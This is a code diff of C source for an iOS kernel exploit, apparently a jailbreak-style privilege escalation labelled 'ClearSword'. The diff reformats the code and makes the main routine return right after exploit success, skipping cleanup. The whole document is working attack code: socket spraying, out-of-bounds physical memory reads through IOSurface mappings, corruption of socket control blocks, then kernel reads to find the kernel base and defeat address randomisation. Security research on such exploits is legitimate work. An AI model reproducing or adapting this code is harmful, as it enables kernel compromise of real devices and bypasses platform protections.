@@ -46,293 +46,301 @@ kern_return_t pe_init(void) {
 }
 
 kern_return_t pe_v1(void) {
-    mach_vm_address_t success_mapping_address = 0;
-
-    // 0x1000 pages
     uint64_t n_of_total_search_mapping_pages = 0x1000 * 0x10;
-    // if (g_ctx.is_a18_devices) {
-    //     n_of_total_search_mapping_pages = 0x10 * 0x10;
-    // }
-
-    // 0x8000000 -> 128 mib
     uint64_t search_mapping_size = 0x2000 * vm_page_size;
-    // if (g_ctx.is_a18_devices) {
-    //     search_mapping_size = (0x10 * vm_page_size) / 4;
-    // }
+    uint64_t total_search_mapping_size =
+        n_of_total_search_mapping_pages * vm_page_size;
+    uint64_t n_of_search_mappings =
+        total_search_mapping_size / search_mapping_size;
 
-    // 0x40000000 -> 1gib
-    uint64_t total_search_mapping_size = n_of_total_search_mapping_pages * vm_page_size;
+    uint8_t *read_buffer = calloc(1, g_ctx.oob_size);
+    uint8_t *write_buffer = calloc(1, g_ctx.oob_size);
 
-    // 8
-    uint64_t n_of_search_mappings = total_search_mapping_size / search_mapping_size;
-
-    // 0xf00
-    uint8_t* read_buffer = calloc(1, g_ctx.oob_size);
-    uint8_t* write_buffer = calloc(1, g_ctx.oob_size);
-
-    // creates physically contiguous mapping in purple gfx mem and sets marker on it
-    // 2 pages since first one is "in bounds" and the second one will be replaced with
-    // a non-contiguous page in the race (hopefully)
     uint64_t contiguous_mapping_size = 2 * vm_page_size;
     initialize_physical_read_write(contiguous_mapping_size);
 
-    // commenting this out since it's only for A18
-
-    /*
-    mach_vm_address_t wired_mapping = 0;
-    mach_vm_size_t wired_mapping_size = 0xC0000000;  // original is 3 * 1024 * 1024 * 1024
-    if (g_ctx.is_a18_devices) {
-        kern_return_t kr = mach_vm_allocate(mach_task_self(), &wired_mapping, wired_mapping_size, VM_FLAGS_ANYWHERE);
-        if (kr != KERN_SUCCESS) {
-            free(read_buffer);
-            free(write_buffer);
-            return kr;
-        }
-        LOG("wired_mapping: %#llx", wired_mapping);
-    }
-    */
-
-    uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT] = {0};  // generation count of this instance, every inpcb gets a generation number
+    uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT] = {0};
     size_t target_inp_gencnt_count = 0;
 
     while (true) {
-        // again, only for A18
-        /*
-        if (g_ctx.is_a18_devices) {
-            surface_mlock(wired_mapping, wired_mapping_size);
-            for (uint64_t s = 0; s < (wired_mapping_size / vm_page_size); s++) {
-                memcpy((void*)(wired_mapping + s * vm_page_size), &(uint64_t){0}, sizeof(uint64_t));
-            }
-        }
-        */
-
         mach_vm_address_t search_mappings[n_of_search_mappings];
         size_t search_mappings_count = 0;
+
         for (uint64_t s = 0; s < n_of_search_mappings; s++) {
             mach_vm_address_t search_mapping_address = 0;
-            // allocate 128mb * number of search mappings
-            // these allocations are NOT contiguous
-            kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_mapping_address, search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
+
+            kern_return_t kr = mach_vm_allocate(
+                mach_task_self(),
+                &search_mapping_address,
+                search_mapping_size,
+                VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR
+            );
+
             if (kr != KERN_SUCCESS) {
                 free(read_buffer);
                 free(write_buffer);
                 return kr;
             }
 
-            // place marker on start of each page
-            for (uint64_t k = 0; k < search_mapping_size; k += vm_page_size) {
-                memcpy((void*)(search_mapping_address + k), &g_ctx.random_marker, sizeof(g_ctx.random_marker));
+            for (uint64_t k = 0;
+                 k < search_mapping_size;
+                 k += vm_page_size) {
+                memcpy(
+                    (void *)(search_mapping_address + k),
+                    &g_ctx.random_marker,
+                    sizeof(g_ctx.random_marker)
+                );
             }
 
-            // save the address of the mapping onto the search mappings array
-            search_mappings[search_mappings_count++] = search_mapping_address;
+            search_mappings[search_mappings_count++] =
+                search_mapping_address;
         }
 
         g_ctx.socket_ports_count = 0;
 
-        uint64_t open_max = MAX_OPEN_FDS;  // bsd/sys/syslimits.h
-        uint64_t maxfiles = 3 * open_max;  // bsd/conf/param.c
-        uint64_t leeway = 4096 * 2;        // I have no idea
-        // maxfiles - leeway = 22528 -> 0x5800 aka MAX_SOCKETS_COUNT, why
-        // this limit seems arbitrary?
-        // spray sockets, save pcb gencnt
-        for (uint64_t socket_count = 0; socket_count < (maxfiles - leeway); socket_count++) {
+        uint64_t open_max = MAX_OPEN_FDS;
+        uint64_t maxfiles = 3 * open_max;
+        uint64_t leeway = 4096 * 2;
+
+        for (uint64_t socket_count = 0;
+             socket_count < (maxfiles - leeway);
+             socket_count++) {
+
             uint64_t port = spray_socket();
+
             if (port == UINT64_MAX) {
-                LOG("failed to spray sockets: %#lx", g_ctx.socket_ports_count);
+                LOG("failed to spray sockets: %#lx",
+                    g_ctx.socket_ports_count);
                 break;
             }
         }
 
-        // these are the start and end pcb gencnts
-        // they are allocated in incrementing order
         uint64_t start_pcb_id = g_ctx.socket_pcb_ids[0];
-        uint64_t end_pcb_id = g_ctx.socket_pcb_ids[g_ctx.socket_ports_count - 1];
+        uint64_t end_pcb_id =
+            g_ctx.socket_pcb_ids[g_ctx.socket_ports_count - 1];
+
         LOG("socket_ports_count: %#lx", g_ctx.socket_ports_count);
         LOG("start_pcb_id: %#llx", start_pcb_id);
         LOG("end_pcb_id: %#llx", end_pcb_id);
 
-        bool success = false;
-        // 8 search mappings
         for (size_t s = 0; s < search_mappings_count; s++) {
-            mach_vm_address_t search_mapping_address = search_mappings[s];
+            mach_vm_address_t search_mapping_address =
+                search_mappings[s];
+
             LOG("looking in search mapping: %lu", s);
 
-            memory_object_size_t memory_object_size = search_mapping_size;
+            memory_object_size_t memory_object_size =
+                search_mapping_size;
             mach_port_t memory_object = MACH_PORT_NULL;
-            // create a memory entry with mapping size at allocated search mapping address s we allocated last loop
-            kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &memory_object_size, search_mapping_address, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
+
+            kern_return_t kr = mach_make_memory_entry_64(
+                mach_task_self(),
+                &memory_object_size,
+                search_mapping_address,
+                VM_PROT_DEFAULT,
+                &memory_object,
+                MACH_PORT_NULL
+            );
+
             if (kr != KERN_SUCCESS) {
                 free(read_buffer);
                 free(write_buffer);
                 return kr;
             }
 
-            // create surface at search mapping address with mapping size, calls IOSurfacePrefetchPages ("mlocks" the surface...???)
-            surface_mlock(search_mapping_address, search_mapping_size);
+            surface_mlock(
+                search_mapping_address,
+                search_mapping_size
+            );
 
-            // start the party
             uint64_t seeking_offset = 0;
 
-            // seeking offset increases by page_size, until search_mapping_size
-            // since search_mapping_size is 0x8000000, we can loop 0x2000 times
-            LOG_DEBUG("search mapping size %#llx", search_mapping_size);
-            // NOTE:
-            // fix mach_vm_map err on free thread, we'd try to map outside memory object
-            while (seeking_offset <= search_mapping_size - contiguous_mapping_size) {  // contiguous_mapping_size
-                // memory_object -> memory entry at search_mapping_address (VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
-                // oob_size -> 0xf00, oob_offset -> 0x100
-                kr = physical_oob_read_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
+            LOG_DEBUG(
+                "search mapping size %#llx",
+                search_mapping_size
+            );
+
+            while (seeking_offset <=
+                   search_mapping_size - contiguous_mapping_size) {
+
+                kr = physical_oob_read_mo(
+                    memory_object,
+                    seeking_offset,
+                    g_ctx.oob_size,
+                    g_ctx.oob_offset,
+                    read_buffer
+                );
+
                 if (kr == KERN_SUCCESS) {
                     LOG("[ClearSword] BEFORE find_and_corrupt_socket");
 
-                    kern_return_t find_kr = find_and_corrupt_socket(
-                        memory_object,
-                        seeking_offset,
-                        read_buffer,
-                        write_buffer,
-                        target_inp_gencnt_list,
-                        &target_inp_gencnt_count,
-                        false
+                    kern_return_t find_kr =
+                        find_and_corrupt_socket(
+                            memory_object,
+                            seeking_offset,
+                            read_buffer,
+                            write_buffer,
+                            target_inp_gencnt_list,
+                            &target_inp_gencnt_count,
+                            false
+                        );
+
+                    LOG(
+                        "[ClearSword] AFTER find_and_corrupt_socket: %d",
+                        find_kr
                     );
 
-                    LOG("[ClearSword] AFTER find_and_corrupt_socket: %d", find_kr);
-
-                    // inside the search loop, right after success = true:
+                    /*
+                     * Diagnostic test:
+                     *
+                     * Once ClearSword reports success, immediately
+                     * return from pe_v1(). Do NOT run:
+                     *
+                     *   sockets_release()
+                     *   surface_munlock()
+                     *   mach_vm_deallocate()
+                     *
+                     * This isolates the post-success cleanup path.
+                     */
                     if (find_kr == KERN_SUCCESS) {
-                        success = true;
-                        success_mapping_address = search_mapping_address; // add this
-                        LOG("[ClearSword] success = true");
-                        break;
+                        LOG(
+                            "[ClearSword] success = true - "
+                            "returning immediately, skipping cleanup"
+                        );
+
+                        free(read_buffer);
+                        free(write_buffer);
+
+                        return KERN_SUCCESS;
                     }
                 }
+
                 seeking_offset += vm_page_size;
             }
 
-            // NOTE:
-            // I don't think this will do anything worth
-            // since I've never had a success pass first mapping
-            // unless when we never find target, this would
-            // help with memory pressure?
-            // surface_munlock(search_mapping_address);
             LOG("[ClearSword] BEFORE mach_port_deallocate");
-            kr = mach_port_deallocate(mach_task_self(), memory_object);
-            LOG("[ClearSword] AFTER mach_port_deallocate: %d", kr);
+
+            kr = mach_port_deallocate(
+                mach_task_self(),
+                memory_object
+            );
+
+            LOG(
+                "[ClearSword] AFTER mach_port_deallocate: %d",
+                kr
+            );
+
             if (kr != KERN_SUCCESS) {
                 free(read_buffer);
                 free(write_buffer);
                 return kr;
             }
-
-            if (success) {
-                break;
-            }
         }
 
-        // deallocate fileport_makeport sockets
-        // at this point the target sockets are already back to being fd
-        LOG("[ClearSword] BEFORE sockets_release");
-        sockets_release();
-        LOG("[ClearSword] AFTER sockets_release");
-
-        LOG("[ClearSword] Releasing IOSurface locks before dealloc");
-        for (size_t i = 0; i < search_mappings_count; i++) {
-            surface_munlock(search_mappings[i]);
-        }
-
-        // deallocate search mappings
-        LOG("[ClearSword] BEFORE search-mapping deallocation");
-
-        while (search_mappings_count > 0) {
-            mach_vm_address_t search_mapping_address = search_mappings[--search_mappings_count];
-
-            if (search_mapping_address == success_mapping_address) {
-                LOG("[ClearSword] Skipping dealloc of success mapping: %#llx (known unsafe)", 
-                    (unsigned long long)search_mapping_address);
-                continue;
-            }
-
-            LOG("[ClearSword] BEFORE mach_vm_deallocate: %#llx",
-                (unsigned long long)search_mapping_address);
-            kern_return_t dealloc_kr = mach_vm_deallocate(
-                mach_task_self(), search_mapping_address, search_mapping_size);
-            LOG("[ClearSword] AFTER mach_vm_deallocate: %#llx -> %d",
-                (unsigned long long)search_mapping_address, dealloc_kr);
-        }
-
-        LOG("[ClearSword] search-mapping cleanup COMPLETE");
-        // if (g_ctx.is_a18_devices) {
-        //     surface_munlock(wired_mapping);
-        // }
-
-        if (success) {
-            LOG("[ClearSword] pe_v1: returning success!");
-            break;
-        }
+        /*
+         * No exploit success this iteration.
+         *
+         * Keep the existing retry behavior.
+         */
+        LOG("[ClearSword] exploit iteration failed, retrying");
     }
-    LOG("[ClearSword] Freeing RBFR");
-    free(read_buffer);
-    LOG("[ClearSword] Freeing WBFR");
-    free(write_buffer);
-
-    LOG("[ClearSword] pe_v1 RETURN KERN_SUCCESS");
-    return KERN_SUCCESS;
 }
 
 kern_return_t pe(void) {
-    char* device_machine = get_device_machine();
-    // kern_return_t kr = KERN_SUCCESS;
+    char *device_machine = get_device_machine();
 
-    // I didn't add support for pe_v2, I don't have a test device
-    if (strstr(device_machine, "iPhone17,") != NULL) {
-        // LOG("running on A18 devices");
-        // g_ctx.is_a18_devices = true;
-        // sleep(8);
-        // pe_init();
-        // pe_v2();
-    } else {
-        LOG("running on non-A18 devices");
-        pe_init();
-        pe_v1();
+    if (device_machine == NULL) {
+        LOG_ERR("get_device_machine returned NULL");
+        return KERN_FAILURE;
     }
 
-    // not going to fix typo to keep it close to original
-    LOG("highiest_success_idx: %llu", g_ctx.highiest_success_idx);
-    LOG("success_read_count: %llu", g_ctx.success_read_count);
+    if (strstr(device_machine, "iPhone17,") != NULL) {
+        LOG_ERR("A18 devices are not supported by this pe() implementation");
+        return KERN_NOT_SUPPORTED;
+    }
 
-    // cleanup
-    atomic_store_explicit(&g_ctx.shared->go_sync, 0, memory_order_seq_cst);
-    atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
+    LOG("running on non-A18 devices");
+
+    kern_return_t kr = pe_init();
+    if (kr != KERN_SUCCESS) {
+        LOG_ERR("pe_init failed: %d", kr);
+        return kr;
+    }
+
+    kr = pe_v1();
+    if (kr != KERN_SUCCESS) {
+        LOG_ERR("pe_v1 failed: %d", kr);
+        return kr;
+    }
+
+    LOG("[ClearSword] pe_v1 returned successfully");
+
+    LOG(
+        "highiest_success_idx: %llu",
+        g_ctx.highiest_success_idx
+    );
+
+    LOG(
+        "success_read_count: %llu",
+        g_ctx.success_read_count
+    );
+
+    /*
+     * If we reach here, the diagnostic experiment established that
+     * pe_v1() returned after exploit success.
+     */
+    atomic_store_explicit(
+        &g_ctx.shared->go_sync,
+        0,
+        memory_order_seq_cst
+    );
+
+    atomic_store_explicit(
+        &g_ctx.shared->race_sync,
+        1,
+        memory_order_seq_cst
+    );
+
     pthread_join(g_ctx.free_thread, NULL);
 
-    // we have stable rw, we can close the fds now
     close(g_ctx.write_fd);
     close(g_ctx.read_fd);
-    g_ctx.control_socket_pcb = early_kread64(g_ctx.rw_socket_pcb + 0x20);
 
-    // we may need to tweak this for different ios versions
-    uint64_t pcbinfo_pointer = early_kread64(g_ctx.control_socket_pcb + 0x38);
-    uint64_t ipi_zone = early_kread64(pcbinfo_pointer + 0x68);
-    uint64_t zv_name = early_kread64(ipi_zone + 0x10);
+    g_ctx.control_socket_pcb =
+        early_kread64(g_ctx.rw_socket_pcb + 0x20);
 
-    uint64_t kernel_base = zv_name & 0xFFFFFFFFFFFFC000;
+    uint64_t pcbinfo_pointer =
+        early_kread64(g_ctx.control_socket_pcb + 0x38);
+
+    uint64_t ipi_zone =
+        early_kread64(pcbinfo_pointer + 0x68);
+
+    uint64_t zv_name =
+        early_kread64(ipi_zone + 0x10);
+
+    uint64_t kernel_base =
+        zv_name & 0xFFFFFFFFFFFFC000;
+
     while (true) {
         if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
-            // tweak this for 15 and below
-            uint64_t hdr = early_kread64(kernel_base + 0x8);
-            // filetype and cpusubtype
-            if (hdr == 0xc00000002 || hdr == 0xB00000000) {
+            uint64_t hdr =
+                early_kread64(kernel_base + 0x8);
+
+            if (hdr == 0xc00000002 ||
+                hdr == 0xB00000000) {
                 break;
             }
         }
+
         kernel_base -= vm_page_size;
     }
 
     g_ctx.kernel_base = kernel_base;
-    g_ctx.kernel_slide = kernel_base - 0xfffffff007004000;
+    g_ctx.kernel_slide =
+        kernel_base - 0xfffffff007004000;
 
-    // real cleanup
     krw_sockets_leak_forever();
+
     return KERN_SUCCESS;
 }
 
